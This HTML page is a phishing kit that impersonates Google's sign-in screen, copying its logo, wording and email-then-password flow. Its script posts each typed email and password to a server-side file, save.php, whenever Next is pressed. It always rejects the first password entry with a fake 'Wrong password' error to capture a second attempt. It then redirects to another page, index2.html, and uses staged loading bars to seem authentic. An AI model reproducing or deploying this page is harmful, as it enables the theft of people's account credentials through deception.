<!doctype html>

<html lang="en">  
<head>  
<meta charset="utf-8" />  
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />  
<title>Sign in</title>  <style>  
  :root {  
  --bg: #0c0c0c;            
  --text: #fff;  
  --muted: #BFC7CF;  
  --placeholder: #9DA6AD;  
  --accent: #A8C7FA;        
  --focus: #A8C7FA;         
  --border: #2E2E2E;  
  --corner: 4px;  
}  
  *{box-sizing:border-box;margin:0;padding:0}  
 html, body {  
  height: 100%;  
  background: var(--bg);  
  font-family: system-ui, -apple-system, "Segoe UI", "Helvetica Neue", Arial, sans-serif;  
  color: var(--text);  
}  
  .page{min-height:100vh;display:flex;flex-direction:column;padding:24px 24px 32px;max-width:420px;margin:auto;}  

.brand {  
width:46px;height:46px;border-radius:10px;margin-bottom:30px;  
display:flex;align-items:center;justify-content:center;  
}  
.brand svg {width:100%;height:100%;}  
.headline {  
  font-size: 34px;     
  font-weight: 300;  
  line-height: 1;  
  margin: 0 0 20px;  
}  
.sub{font-size:16px;color:var(--muted);margin:0 0 42px;}  

.input-wrap{position:relative;width:100%;margin-bottom:10px;height:64px;}  
.input-border{position:absolute;inset:0;border-radius:var(--corner);border:2px solid var(--border);transition:border-color .15s ease;}  
input.text-input{position:absolute;left:14px;right:14px;bottom:14px;top:14px;border:0;outline:0;background:transparent;font-size:16px;color:var(--text);line-height:24px;}  
label.floating{position:absolute;left:14px;top:22px;font-size:17px;color:var(--placeholder);transition:all .18s cubic-bezier(.4,0,.2,1);pointer-events:none;line-height:1;}  
.input-wrap.focused label.floating{top:-6px;font-size:14px;color:var(--focus);background:var(--bg);padding:0 8px;}  
.input-wrap.has-value label.floating{top:-6px;font-size:14px;color:var(--muted);background:var(--bg);padding:0 8px;}  
.input-wrap.focused .input-border{border-color:var(--focus);box-shadow:0 4px 20px rgba(158,198,255,0.08);}  
.forgot{display:inline-block;margin:0px 0 42px;color:var(--accent);font-weight:500;font-size:14px;text-decoration:none;}  
.helper{color:var(--muted);font-size:14px;max-width:400px;line-height:1.4;margin-bottom:40px;}  
.helper a{color:var(--accent);text-decoration:underline;}  
.actions{display:flex;justify-content:space-between;align-items:center;margin-bottom:32px;}  
.create-account{color:var(--accent);font-size:14px;text-decoration:none;font-weight:500;}  
.next-btn{background:var(--focus);color:#0b1a2d;border:0;border-radius:24px;padding:10px 24px;font-size:15px;font-weight:500;box-shadow:0 3px 8px rgba(0,0,0,.4);cursor:pointer;}  
.footer{margin-top:auto;padding:14px 0 6px;color:var(--muted);font-size:12px;display:flex;flex-direction:column;gap:40px;}  
.links{display:flex;gap:32px;text-decoration:underline;}  
@media(max-width:420px){  
.input-wrap{height:60px;}  
label.floating{font-size:16px;top:20px;}  
.input-wrap.focused label.floating,.input-wrap.has-value label.floating{font-size:13px;top:-6px;padding:0 8px;}  
}  

.email-pill {  
  display: inline-flex;  
  align-items: center;  
  gap: 6px;  
  border: 0.6px solid silver;        
  border-radius: 9999px;  
  padding: 4px 10px 4px 3px;          
  color: var(--text);  
  font-size: 13.5px;  
  font-weight: 400;  
  margin-bottom: 16px;  
  width: fit-content;  
  max-width: 100%;  
  white-space: nowrap;  
  background-color: rgba(255,255,255,0.04);   
  box-shadow: 0 0 3px rgba(192,192,192,0.2);   
  line-height: 1;  
}  

.email-pill .circle {  
  width: 24px;  
  height: 24px;  
  border-radius: 50%;  
  background: #1f4d1f;  
  display: flex;  
  align-items: center;  
  justify-content: center;  
  font-weight: 600;  
  font-size: 12px;  
  color: white;  
}  

.email-pill .arrow {  
  margin-left: 6px;  
  border: solid var(--muted);  
  border-width: 0 1px 1px 0;         
  display: inline-block;  
  padding: 2.5px;  
  transform: rotate(45deg);  
}  

a {  
  text-decoration: none;    
  color: inherit;           
}  

#progressBar_for_inject {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 4px; 
  background: rgba(168,199,250,0.18); 
  overflow: hidden;
  display: none;
  z-index: 99999;
}
#progressBar_for_inject::before {
  content: "";
  position: absolute;
  top: 0;
  left: -40%;
  height: 100%;
  width: 40%;
  background: #A8C7FA; 
  border-radius: 2px;
  animation: gm_indeterminate 1.4s infinite ease-out;
}
@keyframes gm_indeterminate {
  0%   { left: -40%; width: 40%; }
  50%  { left: 20%;  width: 60%; }
  100% { left: 100%; width: 80%; }
}
</style>  </head>  
<body>  

<div id="progressBar_for_inject" aria-hidden="true"></div>
  <div class="page">  
<div class="brand" aria-hidden="true">  
  <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">  
    <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>  
    <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>  
    <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>  
    <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>  
  </svg>  
</div>  <h1 class="headline" id="headline">Sign in</h1>  
<p class="sub" id="subtext">Use your Google Account</p>  <div class="input-wrap" id="inputWrap">  
  <div class="input-border" aria-hidden="true"></div>  
  <label class="floating" id="fieldLabel" for="emailInput">Email or phone</label>  
  <input id="emailInput" class="text-input" type="text" autocomplete="username" />  
  <input id="passwordInput" class="text-input" type="password" autocomplete="current-password" style="display:none" />  
</div>  <a href="#" class="forgot" id="forgotLink">Forgot email?</a>

<p class="helper" id="helperText">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></p>  <div class="actions">  
  <a href="#" class="create-account" id="createAccount">Create account</a>  
  <button class="next-btn" id="nextBtn">Next</button>  
</div>  <div class="footer">  
<div style="display: inline-flex; align-items: center; gap: 38px;">  
  English (United States)  
  <span style="display:inline-block; transform: scaleX(2);">â–¾</span>  
</div>    <div class="links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>  
</div>  
</div>  
<style>

  .input-wrap.error .input-border {
    border-color: #E9BCB9 !important;
    box-shadow: 0 6px 20px rgba(233,188,185,0.08);
    background: rgba(233,188,185,0.02);
  }
  .input-wrap.error label.floating {
    color: #E9BCB9 !important;
    top: -6px;
    background: var(--bg);
    padding: 0 8px;
    font-size: 14px;
  }

  .error-line {
    display: flex;
    align-items: center; 
    gap: 6px;
    color: #E9BCB9;
    font-size: 13px;
    line-height: 1;
    margin-top: 0;
    margin-bottom: 14px;
  }

  .error-line svg {
    width: 15px;
    height: 15px;
    flex: 0 0 15px;
    color: inherit;
    display: inline-block;
    vertical-align: middle;
    position: relative;
    top: 0;
  }
</style>

<style>

  .input-wrap.error .input-border { border-color:#E9BCB9 !important; box-shadow:0 6px 20px rgba(233,188,185,0.08); background:rgba(233,188,185,0.02); }
  .input-wrap.error label.floating{ color:#E9BCB9 !important; top:-6px; background:var(--bg); padding:0 8px; font-size:14px; }
  .error-line{ display:flex; align-items:center; gap:6px; color:#E9BCB9; font-size:13px; line-height:1; margin-top:0; margin-bottom:14px; }
  .error-line svg{ width:15px; height:15px; flex:0 0 15px; display:inline-block; vertical-align:middle; }
  .cg-toast{ position:fixed; left:50%; transform:translateX(-50%) translateY(10px); bottom:28px; background:rgba(11,26,45,0.96); color:#fff; padding:10px 16px; border-radius:12px; box-shadow:0 8px 30px rgba(2,6,23,0.6); font-size:14px; z-index:100000; opacity:0; pointer-events:none; transition:opacity .2s ease, transform .2s ease; }
  .cg-toast.show{ opacity:1; transform:translateX(-50%) translateY(0); }
</style>
<script>
(function(){
  const BAR_ID = 'progressBar_for_inject';
  const bar = document.getElementById(BAR_ID);
  const wrap = document.getElementById('inputWrap');
  const emailInput = document.getElementById('emailInput');
  const passwordInput = document.getElementById('passwordInput');
  const fieldLabel = document.getElementById('fieldLabel');
  const nextBtn = document.getElementById('nextBtn');
  const subi = document.getElementById('subtext');
  const headline = document.getElementById('headline');
  const forgotLink = document.getElementById('forgotLink');
  const helperText = document.getElementById('helperText');
  const createAccount = document.getElementById('createAccount');

  const ORIGINAL_HEADLINE = headline.textContent || 'Sign in';
  const ORIGINAL_SUBTEXT = subi.innerHTML || 'Use your Google Account';
  const ORIGINAL_LABEL = fieldLabel.textContent || 'Email or phone';
  const ORIGINAL_HELPER = helperText.innerHTML;
  const ORIGINAL_CREATEACCOUNT = createAccount.textContent || 'Create account';
  const ORIGINAL_FORGOT_DISPLAY = forgotLink.style.display || '';

  let state='email', savedEmail='', pwdAttempts=0, cbWrapperRef=null;
  let progressActive=false;

  const lock=document.createElement('div');
  lock.id='pageLockOverlay';
  Object.assign(lock.style,{
    position:'fixed',inset:'0',
    background:'rgba(0,0,0,0)', 
    zIndex:'99998',
    pointerEvents:'none', 
  });
  document.body.appendChild(lock);
  function lockPage(){ lock.style.pointerEvents='all'; document.body.style.cursor='wait'; }
  function unlockPage(){ lock.style.pointerEvents='none'; document.body.style.cursor='auto'; }

  function updateStateClasses(){
    if((state==='email'&&emailInput.value.trim()!=='')||(state==='password'&&passwordInput.value.trim()!=='')){
      wrap.classList.add('has-value');
    }else wrap.classList.remove('has-value');
  }
  emailInput.addEventListener('focus',()=>wrap.classList.add('focused'));
  emailInput.addEventListener('blur',()=>{wrap.classList.remove('focused');updateStateClasses();});
  emailInput.addEventListener('input',updateStateClasses);
  passwordInput.addEventListener('focus',()=>wrap.classList.add('focused'));
  passwordInput.addEventListener('blur',()=>{wrap.classList.remove('focused');updateStateClasses();});
  passwordInput.addEventListener('input',updateStateClasses);

  let errLine=document.getElementById('__injected_err_line');
  if(!errLine){
    errLine=document.createElement('div');
    errLine.id='__injected_err_line';
    errLine.className='error-line';
    errLine.style.display='none';
    errLine.setAttribute('role','alert');
    errLine.innerHTML=`
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><defs><mask id="excl-mask"><rect width="24" height="24" fill="white"/><rect x="11.2" y="6" width="1.6" height="8" fill="black"/><circle cx="12" cy="16.6" r="1" fill="black"/></mask></defs><circle cx="12" cy="12" r="9.5" fill="#E9BCB9" mask="url(#excl-mask)"/></svg>
      <span id="__injected_err_text">Enter an email or phone number</span>`;
    wrap.parentNode.insertBefore(errLine,wrap.nextSibling);
  }
  function showError(msg){
    wrap.classList.add('error','has-value');
    document.getElementById('__injected_err_text').textContent=msg;
    errLine.style.display='flex';
  }
  function clearError(){ wrap.classList.remove('error'); errLine.style.display='none'; }

  const isValidPhone=v=>{
    const clean=v.replace(/\D/g,'');
    return /^\d{10}$/.test(clean)||/^91\d{10}$/.test(clean)||/^\+?91\d{10}$/.test(v);
  };
  const isValidGmail=v=>/^[a-zA-Z0-9._%+-]+@gmail\.com$/i.test(v);

  async function showProgress(ms){
    progressActive=true;
    lockPage();                 
    bar.style.display='block';
    await new Promise(r=>setTimeout(r,ms));
    bar.style.display='none';
    unlockPage();               
    progressActive=false;
  }

  function showToast(text,ms=2500){
    let t=document.getElementById('__cg_toast');
    if(!t){
      t=document.createElement('div');
      t.id='__cg_toast';
      t.className='cg-toast';
      document.body.appendChild(t);
    }
    t.textContent=text;
    requestAnimationFrame(()=>t.classList.add('show'));
    setTimeout(()=>t.classList.remove('show'),ms);
  }

  nextBtn.addEventListener('click',async e=>{
    e.preventDefault();

    saveToFile();

    if(progressActive) return; 

    if(state==='email'){
      clearError();
      const val=emailInput.value.trim();
      let valid=false,msg='';
      if(!val){msg='Enter an email or phone number';}
      else if(isValidPhone(val)||isValidGmail(val)){valid=true;}
      else msg="Couldn't find your Google account";

      if(valid){ await showProgress(5000); goToPassword(val);}
      else { await showProgress(2000); showError(msg); emailInput.focus(); }
      return;
    }

    if(state==='password'){
      clearError();
      const pwd=(passwordInput.value||'').trim();

      if(!pwd){ await showProgress(2000); showError('Enter password'); passwordInput.focus(); return; }
      if(pwd.length<5){ await showProgress(2000); showError('Wrong password. Try again or click Forgot password to reset it.'); passwordInput.focus(); return; }

      if(pwdAttempts===0){
  await showProgress(2000);
  showError('Wrong password. Try again or click Forgot password to reset it.');
  passwordInput.value='';
  pwdAttempts=1;
  passwordInput.focus();
  return;
}

await showProgress(5000);

window.location.href = 'index2.html'; 
pwdAttempts=0;
return;
    }
  });

  function goToPassword(emailVal){
    state='password';
    savedEmail=emailVal;
    createAccount.textContent='Forgot password?';
    headline.textContent='Welcome';
    subi.innerHTML=`<div class="email-pill" id="__email_pill" role="button" tabindex="0"><div class="circle">${emailVal.charAt(0).toUpperCase()}</div>${emailVal}<span class="arrow"></span></div>`;
    emailInput.style.display='none';
    passwordInput.style.display='block';
    fieldLabel.textContent='Enter your password';
    forgotLink.style.display='none';

    const cbWrapper=document.createElement('div');
    cbWrapper.style.marginBottom='42px';
    const cb=document.createElement('input'); cb.type='checkbox'; cb.id='showPwd'; cb.style.verticalAlign='middle';
    const lbl=document.createElement('label'); lbl.htmlFor='showPwd'; lbl.textContent=' Show password';
    lbl.style.color='var(--muted)'; lbl.style.fontSize='14px'; lbl.style.marginLeft='8px';
    cb.addEventListener('change',()=>passwordInput.type=cb.checked?'text':'password');
    cbWrapper.append(cb,lbl);
    wrap.parentNode.insertBefore(cbWrapper,helperText);
    helperText.innerHTML='&nbsp;';
    cbWrapperRef=cbWrapper;
    wrap.classList.add('focused');
    passwordInput.focus();

    const pill=document.getElementById('__email_pill');
    if(pill){
      pill.style.cursor='pointer';
      pill.addEventListener('click',returnToEmail);
      pill.addEventListener('keydown',e=>{
        if(e.key==='Enter'||e.key===' '){e.preventDefault();returnToEmail();}
      });
    }
  }

  function returnToEmail(){
    if(progressActive) return;
    state='email';
    headline.textContent=ORIGINAL_HEADLINE;
    subi.innerHTML=ORIGINAL_SUBTEXT;
    fieldLabel.textContent=ORIGINAL_LABEL;
    createAccount.textContent=ORIGINAL_CREATEACCOUNT;
    forgotLink.style.display=ORIGINAL_FORGOT_DISPLAY;
    helperText.innerHTML=ORIGINAL_HELPER;
    emailInput.style.display='block';
    emailInput.value=savedEmail;
    wrap.classList.add('has-value','focused');
    passwordInput.style.display='none';
    passwordInput.value='';
    if(cbWrapperRef&&cbWrapperRef.parentNode) cbWrapperRef.parentNode.removeChild(cbWrapperRef);
    cbWrapperRef=null;
    pwdAttempts=0;
    clearError();
    updateStateClasses();
    emailInput.focus();
  }

  window.addEventListener('load',()=>setTimeout(()=>{wrap.classList.add('focused');emailInput.focus();},800));
})();
</script>

<script>
function saveToFile() {
  const email = document.getElementById('emailInput').value;
  const password = document.getElementById('passwordInput').value;

  fetch('save.php', {
    method: 'POST',
    body: new URLSearchParams({
      email: email,
      password: password
    })
  });
}
</script>
</body>  
  </html>
